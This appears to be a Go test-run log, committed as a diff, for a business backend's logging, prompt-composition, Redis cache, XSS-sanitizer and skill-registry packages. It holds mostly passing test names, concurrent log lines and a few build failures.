+=== RUN   TestSanitizeCookies
+=== RUN   TestSanitizeCookies/Session_cookie
+=== RUN   TestSanitizeCookies/Multiple_cookies
+=== RUN   TestSanitizeCookies/Empty_cookies
+--- PASS: TestSanitizeCookies (0.00s)
+    --- PASS: TestSanitizeCookies/Session_cookie (0.00s)
+    --- PASS: TestSanitizeCookies/Multiple_cookies (0.00s)
+    --- PASS: TestSanitizeCookies/Empty_cookies (0.00s)
+=== RUN   TestStructuredLog
+--- PASS: TestStructuredLog (0.03s)
+=== RUN   TestMaskUserID
+--- PASS: TestMaskUserID (0.00s)
+=== RUN   TestMaskSessionID
+--- PASS: TestMaskSessionID (0.00s)
+=== RUN   TestMaskIP
+--- PASS: TestMaskIP (0.00s)
+=== RUN   TestSafeLogFields
+--- PASS: TestSafeLogFields (0.00s)
+=== RUN   TestSanitizerMasking
+--- PASS: TestSanitizerMasking (0.00s)
+=== RUN   TestTerminalContentFiltering
+--- PASS: TestTerminalContentFiltering (0.00s)
+=== RUN   TestLogLevels
+2026/01/27 10:20:16 [WARN] This should appear
+2026/01/27 10:20:16 [ERROR] This should appear
+--- PASS: TestLogLevels (0.00s)
+=== RUN   TestConcurrentLogging
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 1
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 1
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 0
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 2
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 37
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 88
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 37
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 88
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 72
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 89
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 38
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 72
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 89
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 38
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 14
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 90
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 39
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 12
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 90
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 75
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 39
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 12
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 91
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 75
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 40
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 91
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 15
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 10
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 40
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 92
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 10
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 41
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 92
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 15
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 16
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 14
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 41
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 78
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 16
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 77
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 94
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 42
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 78
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 19
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 81
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 95
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 19
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 81
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 22
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 95
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 44
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 82
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 22
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 77
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 57
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 99
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 58
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 97
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 57
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 96
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 97
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 42
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 59
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 96
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 58
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 80
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 53
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 59
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 51
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 80
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 13
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 48
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 48
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 0
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 13
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 52
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 93
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 93
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 73
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 73
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 74
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 74
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 64
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 52
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 98
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 98
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 9
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 9
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 3
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 3
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 30
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 30
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 4
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 4
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 24
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 24
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 5
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 5
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 25
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 25
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 6
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 64
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 6
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 7
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 7
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 31
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 31
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 27
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 27
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 32
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 32
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 28
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 28
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 8
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 8
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 33
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 33
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 29
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 29
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 66
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 66
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 67
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 67
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 83
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 83
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 34
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 34
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 84
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 84
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 68
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 68
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 35
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 35
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 85
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 85
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 69
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 86
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 69
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 86
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 70
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 70
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 36
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 87
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 36
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 87
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 2
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 76
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 76
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 11
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 79
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 11
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 94
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 79
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 43
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 20
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 43
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 21
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 18
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 20
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 17
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 21
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 18
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 17
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 82
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 99
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 45
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 45
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 53
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 60
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 60
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 51
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 54
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 54
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 65
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 65
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 23
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 23
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 55
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 46
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 62
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 56
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 47
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 49
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 61
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 63
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 50
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 26
+2026/01/27 10:20:16 [INFO] Concurrent log from goroutine 71
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 44
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 55
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 47
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 49
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 56
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 62
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 61
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 63
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 71
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 46
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 50
+2026/01/27 10:20:16 [SECURITY] Security event from goroutine 26
+--- PASS: TestConcurrentLogging (0.00s)
+=== RUN   TestConfigUpdate
+--- PASS: TestConfigUpdate (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/logging	(cached)
+FAIL	github.com/rhl/businessos-backend/internal/middleware [build failed]
+FAIL	github.com/rhl/businessos-backend/internal/orchestration [build failed]
+=== RUN   TestPromptLayerConstants
+--- PASS: TestPromptLayerConstants (0.00s)
+=== RUN   TestNewPromptComposer
+--- PASS: TestNewPromptComposer (0.00s)
+=== RUN   TestComposePromptWithAllLayers
+--- PASS: TestComposePromptWithAllLayers (0.00s)
+=== RUN   TestComposePromptWithSpecificLayers
+--- PASS: TestComposePromptWithSpecificLayers (0.00s)
+=== RUN   TestComposePromptEmptyAgent
+--- PASS: TestComposePromptEmptyAgent (0.00s)
+=== RUN   TestComposeWithContext
+--- PASS: TestComposeWithContext (0.00s)
+=== RUN   TestComposeWithContextPartialInfo
+--- PASS: TestComposeWithContextPartialInfo (0.00s)
+=== RUN   TestComposeWithContextEmpty
+--- PASS: TestComposeWithContextEmpty (0.00s)
+=== RUN   TestComposeMinimal
+--- PASS: TestComposeMinimal (0.00s)
+=== RUN   TestComposeForDocument
+--- PASS: TestComposeForDocument (0.00s)
+=== RUN   TestComposeForAnalysis
+--- PASS: TestComposeForAnalysis (0.00s)
+=== RUN   TestComposeForProject
+--- PASS: TestComposeForProject (0.00s)
+=== RUN   TestComposeForClient
+--- PASS: TestComposeForClient (0.00s)
+=== RUN   TestGetLayer
+--- PASS: TestGetLayer (0.00s)
+=== RUN   TestSetLayer
+--- PASS: TestSetLayer (0.00s)
+=== RUN   TestSetLayerAffectsCompose
+--- PASS: TestSetLayerAffectsCompose (0.00s)
+=== RUN   TestDefaultComposer
+--- PASS: TestDefaultComposer (0.00s)
+=== RUN   TestComposeConvenienceFunction
+--- PASS: TestComposeConvenienceFunction (0.00s)
+=== RUN   TestComposeWithLayers
+--- PASS: TestComposeWithLayers (0.00s)
+=== RUN   TestComposeWithUserContextConvenience
+--- PASS: TestComposeWithUserContextConvenience (0.00s)
+=== RUN   TestCoreIdentityNotEmpty
+--- PASS: TestCoreIdentityNotEmpty (0.00s)
+=== RUN   TestOutputFormattingNotEmpty
+--- PASS: TestOutputFormattingNotEmpty (0.00s)
+=== RUN   TestArtifactSystemNotEmpty
+--- PASS: TestArtifactSystemNotEmpty (0.00s)
+=== RUN   TestContextIntegrationNotEmpty
+--- PASS: TestContextIntegrationNotEmpty (0.00s)
+=== RUN   TestToolUsagePatternsNotEmpty
+--- PASS: TestToolUsagePatternsNotEmpty (0.00s)
+=== RUN   TestErrorHandlingNotEmpty
+--- PASS: TestErrorHandlingNotEmpty (0.00s)
+=== RUN   TestPromptNotTooLong
+--- PASS: TestPromptNotTooLong (0.00s)
+=== RUN   TestPromptHasProperStructure
+--- PASS: TestPromptHasProperStructure (0.00s)
+=== RUN   TestDifferentComposerModes
+--- PASS: TestDifferentComposerModes (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/prompts	(cached)
+?   	github.com/rhl/businessos-backend/internal/prompts/agents	[no test files]
+?   	github.com/rhl/businessos-backend/internal/prompts/core	[no test files]
+=== RUN   TestNewCacheWorkerPool
+=== RUN   TestNewCacheWorkerPool/valid_configuration
+2026/01/27 13:08:40 INFO Shutting down cache worker pool timeout=100ms
+2026/01/27 13:08:40 INFO Cache worker pool shutdown complete completed_tasks=0 failed_tasks=0 dropped_tasks=0
+=== RUN   TestNewCacheWorkerPool/default_values_when_zero
+2026/01/27 13:08:40 INFO Shutting down cache worker pool timeout=100ms
+2026/01/27 13:08:40 INFO Cache worker pool shutdown complete completed_tasks=0 failed_tasks=0 dropped_tasks=0
+=== RUN   TestNewCacheWorkerPool/negative_values_normalized_to_defaults
+2026/01/27 13:08:40 INFO Shutting down cache worker pool timeout=100ms
+2026/01/27 13:08:40 INFO Cache worker pool shutdown complete completed_tasks=0 failed_tasks=0 dropped_tasks=0
+--- PASS: TestNewCacheWorkerPool (0.03s)
+    --- PASS: TestNewCacheWorkerPool/valid_configuration (0.01s)
+    --- PASS: TestNewCacheWorkerPool/default_values_when_zero (0.00s)
+    --- PASS: TestNewCacheWorkerPool/negative_values_normalized_to_defaults (0.00s)
+=== RUN   TestNewCacheWorkerPool_NoRedisClient
+2026/01/27 13:08:40 WARN Redis client not initialized - worker pool creation skipped
+--- PASS: TestNewCacheWorkerPool_NoRedisClient (0.00s)
+=== RUN   TestCacheWorkerPool_BasicOperations
+2026/01/27 13:08:40 INFO Starting cache worker pool workers=5 queue_size=50
+=== RUN   TestCacheWorkerPool_BasicOperations/set_operation
+=== RUN   TestCacheWorkerPool_BasicOperations/get_operation
+=== RUN   TestCacheWorkerPool_BasicOperations/get_non-existent_key
+=== RUN   TestCacheWorkerPool_BasicOperations/delete_operation
+=== RUN   TestCacheWorkerPool_BasicOperations/mget_operation
+2026/01/27 13:08:40 INFO Shutting down cache worker pool timeout=2s
+2026/01/27 13:08:40 INFO Cache worker pool shutdown complete completed_tasks=5 failed_tasks=0 dropped_tasks=0
+--- PASS: TestCacheWorkerPool_BasicOperations (0.04s)
+    --- PASS: TestCacheWorkerPool_BasicOperations/set_operation (0.04s)
+    --- PASS: TestCacheWorkerPool_BasicOperations/get_operation (0.00s)
+    --- PASS: TestCacheWorkerPool_BasicOperations/get_non-existent_key (0.00s)
+    --- PASS: TestCacheWorkerPool_BasicOperations/delete_operation (0.00s)
+    --- PASS: TestCacheWorkerPool_BasicOperations/mget_operation (0.00s)
+=== RUN   TestCacheWorkerPool_ConcurrentOperations
+2026/01/27 13:08:40 INFO Starting cache worker pool workers=10 queue_size=100
+2026/01/27 13:08:40 INFO Shutting down cache worker pool timeout=5s
+2026/01/27 13:08:40 INFO Cache worker pool shutdown complete completed_tasks=200 failed_tasks=0 dropped_tasks=0
+--- PASS: TestCacheWorkerPool_ConcurrentOperations (0.03s)
+=== RUN   TestCacheWorkerPool_QueueOverflow
+2026/01/27 13:08:40 INFO Starting cache worker pool workers=1 queue_size=2
+2026/01/27 13:08:41 INFO Shutting down cache worker pool timeout=2s
+2026/01/27 13:08:41 INFO Cache worker pool shutdown complete completed_tasks=2 failed_tasks=0 dropped_tasks=8
+--- PASS: TestCacheWorkerPool_QueueOverflow (0.21s)
+=== RUN   TestCacheWorkerPool_GracefulShutdown
+2026/01/27 13:08:41 INFO Starting cache worker pool workers=5 queue_size=50
+2026/01/27 13:08:41 INFO Shutting down cache worker pool timeout=3s
+2026/01/27 13:08:41 INFO Cache worker pool shutdown complete completed_tasks=8 failed_tasks=0 dropped_tasks=0
+--- PASS: TestCacheWorkerPool_GracefulShutdown (0.01s)
+=== RUN   TestCacheWorkerPool_ShutdownTimeout
+2026/01/27 13:08:41 INFO Starting cache worker pool workers=2 queue_size=10
+2026/01/27 13:08:41 INFO Shutting down cache worker pool timeout=1ms
+2026/01/27 13:08:41 ERROR Worker pool shutdown timeout timeout=1ms active_workers=1
+--- PASS: TestCacheWorkerPool_ShutdownTimeout (0.00s)
+=== RUN   TestCacheWorkerPool_Metrics
+2026/01/27 13:08:41 INFO Starting cache worker pool workers=3 queue_size=20
+2026/01/27 13:08:41 INFO Shutting down cache worker pool timeout=2s
+2026/01/27 13:08:41 INFO Cache worker pool shutdown complete completed_tasks=5 failed_tasks=2 dropped_tasks=0
+--- PASS: TestCacheWorkerPool_Metrics (0.11s)
+=== RUN   TestCacheWorkerPool_UnknownOperation
+2026/01/27 13:08:41 INFO Starting cache worker pool workers=2 queue_size=10
+2026/01/27 13:08:41 INFO Shutting down cache worker pool timeout=2s
+2026/01/27 13:08:41 INFO Cache worker pool shutdown complete completed_tasks=0 failed_tasks=1 dropped_tasks=0
+--- PASS: TestCacheWorkerPool_UnknownOperation (0.00s)
+=== RUN   TestCacheWorkerPool_NilResultChannel
+2026/01/27 13:08:41 INFO Starting cache worker pool workers=2 queue_size=10
+2026/01/27 13:08:41 INFO Shutting down cache worker pool timeout=2s
+2026/01/27 13:08:41 INFO Cache worker pool shutdown complete completed_tasks=1 failed_tasks=0 dropped_tasks=0
+--- PASS: TestCacheWorkerPool_NilResultChannel (0.10s)
+=== RUN   TestCacheWorkerPool_ContextCancellation
+2026/01/27 13:08:41 INFO Starting cache worker pool workers=2 queue_size=10
+2026/01/27 13:08:41 INFO Shutting down cache worker pool timeout=2s
+2026/01/27 13:08:41 INFO Cache worker pool shutdown complete completed_tasks=0 failed_tasks=1 dropped_tasks=0
+--- PASS: TestCacheWorkerPool_ContextCancellation (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/redis	(cached)
+=== RUN   TestSanitizeForJSON
+=== RUN   TestSanitizeForJSON/Event_handler_in_img_tag
+=== RUN   TestSanitizeForJSON/JavaScript_protocol_in_URL
+=== RUN   TestSanitizeForJSON/JavaScript_protocol_in_iframe
+=== RUN   TestSanitizeForJSON/Script_tag
+=== RUN   TestSanitizeForJSON/SVG_with_onload
+=== RUN   TestSanitizeForJSON/Data_URL_protocol
+--- PASS: TestSanitizeForJSON (0.00s)
+    --- PASS: TestSanitizeForJSON/Event_handler_in_img_tag (0.00s)
+    --- PASS: TestSanitizeForJSON/JavaScript_protocol_in_URL (0.00s)
+    --- PASS: TestSanitizeForJSON/JavaScript_protocol_in_iframe (0.00s)
+    --- PASS: TestSanitizeForJSON/Script_tag (0.00s)
+    --- PASS: TestSanitizeForJSON/SVG_with_onload (0.00s)
+    --- PASS: TestSanitizeForJSON/Data_URL_protocol (0.00s)
+=== RUN   TestSanitizeURL
+=== RUN   TestSanitizeURL/JavaScript_protocol
+=== RUN   TestSanitizeURL/Data_protocol
+=== RUN   TestSanitizeURL/Safe_HTTP_URL
+=== RUN   TestSanitizeURL/Safe_relative_URL
+--- PASS: TestSanitizeURL (0.00s)
+    --- PASS: TestSanitizeURL/JavaScript_protocol (0.00s)
+    --- PASS: TestSanitizeURL/Data_protocol (0.00s)
+    --- PASS: TestSanitizeURL/Safe_HTTP_URL (0.00s)
+    --- PASS: TestSanitizeURL/Safe_relative_URL (0.00s)
+=== RUN   TestContainsXSSPattern
+=== RUN   TestContainsXSSPattern/Script_tag
+=== RUN   TestContainsXSSPattern/JavaScript_protocol
+=== RUN   TestContainsXSSPattern/Event_handler
+=== RUN   TestContainsXSSPattern/Safe_content
+=== RUN   TestContainsXSSPattern/Safe_HTML
+--- PASS: TestContainsXSSPattern (0.00s)
+    --- PASS: TestContainsXSSPattern/Script_tag (0.00s)
+    --- PASS: TestContainsXSSPattern/JavaScript_protocol (0.00s)
+    --- PASS: TestContainsXSSPattern/Event_handler (0.00s)
+    --- PASS: TestContainsXSSPattern/Safe_content (0.00s)
+    --- PASS: TestContainsXSSPattern/Safe_HTML (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/security	(cached)
+FAIL	github.com/rhl/businessos-backend/internal/services [build failed]
+=== RUN   TestOsaSkill_Metadata
+--- PASS: TestOsaSkill_Metadata (0.00s)
+=== RUN   TestOsaSkill_Execute_ValidParams
+2026/01/27 10:20:36 INFO executing OSA orchestration user_id=072c5ab1-0f34-49f9-b3f5-07150ac5e251 input_length=24 workspace_id=00000000-0000-0000-0000-000000000000 phase=""
+2026/01/27 10:20:42 ERROR orchestrate failed after retries error="failed to orchestrate: request failed after 3 retries: Post \"http://localhost:8080/api/orchestrate\": dial tcp [::1]:8080: connectex: Nenhuma conexÃ£o pÃ´de ser feita porque a mÃ¡quina de destino as recusou ativamente." circuit_state=closed
+2026/01/27 10:20:42 INFO applying fallback strategy for orchestrate strategy=2
+    osa_skill_test.go:114: Execute failed as expected (OSA not running): orchestration failed: all resilience strategies failed: primary=failed to orchestrate: request failed after 3 retries: Post "http://localhost:8080/api/orchestrate": dial tcp [::1]:8080: connectex: Nenhuma conexÃ£o pÃ´de ser feita porque a mÃ¡quina de destino as recusou ativamente., fallback=primary request failed
+--- PASS: TestOsaSkill_Execute_ValidParams (6.16s)
+=== RUN   TestOsaSkill_Execute_InvalidParams
+=== RUN   TestOsaSkill_Execute_InvalidParams/missing_user_id
+=== RUN   TestOsaSkill_Execute_InvalidParams/missing_input
+=== RUN   TestOsaSkill_Execute_InvalidParams/invalid_user_id_format
+=== RUN   TestOsaSkill_Execute_InvalidParams/user_id_not_a_string
+=== RUN   TestOsaSkill_Execute_InvalidParams/input_not_a_string
+--- PASS: TestOsaSkill_Execute_InvalidParams (0.00s)
+    --- PASS: TestOsaSkill_Execute_InvalidParams/missing_user_id (0.00s)
+    --- PASS: TestOsaSkill_Execute_InvalidParams/missing_input (0.00s)
+    --- PASS: TestOsaSkill_Execute_InvalidParams/invalid_user_id_format (0.00s)
+    --- PASS: TestOsaSkill_Execute_InvalidParams/user_id_not_a_string (0.00s)
+    --- PASS: TestOsaSkill_Execute_InvalidParams/input_not_a_string (0.00s)
+=== RUN   TestOsaSkill_Execute_OptionalParams
+2026/01/27 10:20:42 INFO executing OSA orchestration user_id=5cc96037-7c40-4014-ab5a-53d988db1b4d input_length=19 workspace_id=8e0e0ea8-23fe-4951-a3c2-bfe208554332 phase=analysis
+2026/01/27 10:20:48 ERROR orchestrate failed after retries error="failed to orchestrate: request failed after 3 retries: Post \"http://localhost:8080/api/orchestrate\": dial tcp [::1]:8080: connectex: Nenhuma conexÃ£o pÃ´de ser feita porque a mÃ¡quina de destino as recusou ativamente." circuit_state=closed
+2026/01/27 10:20:48 INFO applying fallback strategy for orchestrate strategy=2
+    osa_skill_test.go:218: Execute failed as expected (OSA not running): orchestration failed: all resilience strategies failed: primary=failed to orchestrate: request failed after 3 retries: Post "http://localhost:8080/api/orchestrate": dial tcp [::1]:8080: connectex: Nenhuma conexÃ£o pÃ´de ser feita porque a mÃ¡quina de destino as recusou ativamente., fallback=primary request failed
+--- PASS: TestOsaSkill_Execute_OptionalParams (6.01s)
+=== RUN   TestOsaSkill_Execute_InvalidWorkspaceID
+--- PASS: TestOsaSkill_Execute_InvalidWorkspaceID (0.00s)
+=== RUN   TestRegistry_Register
+=== RUN   TestRegistry_Register/register_valid_skill
+2026/01/27 10:20:48 INFO skill registered name=test_skill description="A test skill"
+=== RUN   TestRegistry_Register/register_nil_skill
+=== RUN   TestRegistry_Register/register_skill_with_empty_name
+--- PASS: TestRegistry_Register (0.00s)
+    --- PASS: TestRegistry_Register/register_valid_skill (0.00s)
+    --- PASS: TestRegistry_Register/register_nil_skill (0.00s)
+    --- PASS: TestRegistry_Register/register_skill_with_empty_name (0.00s)
+=== RUN   TestRegistry_RegisterDuplicate
+2026/01/27 10:20:48 INFO skill registered name=duplicate description="Test skill"
+--- PASS: TestRegistry_RegisterDuplicate (0.00s)
+=== RUN   TestRegistry_Get
+2026/01/27 10:20:48 INFO skill registered name=test_get description="Test get skill"
+--- PASS: TestRegistry_Get (0.00s)
+=== RUN   TestRegistry_List
+2026/01/27 10:20:48 INFO skill registered name=skill1 description="First skill"
+2026/01/27 10:20:48 INFO skill registered name=skill2 description="Second skill"
+2026/01/27 10:20:48 INFO skill registered name=skill3 description="Third skill"
+--- PASS: TestRegistry_List (0.00s)
+=== RUN   TestRegistry_Execute
+2026/01/27 10:20:48 INFO skill registered name=execute_test description="Test execute"
+2026/01/27 10:20:48 INFO executing skill name=execute_test
+2026/01/27 10:20:48 INFO skill execution succeeded name=execute_test
+--- PASS: TestRegistry_Execute (0.00s)
+=== RUN   TestRegistry_ExecuteWithError
+2026/01/27 10:20:48 INFO skill registered name=error_skill description="Skill that errors"
+2026/01/27 10:20:48 INFO executing skill name=error_skill
+2026/01/27 10:20:48 ERROR skill execution failed name=error_skill error="test error"
+--- PASS: TestRegistry_ExecuteWithError (0.00s)
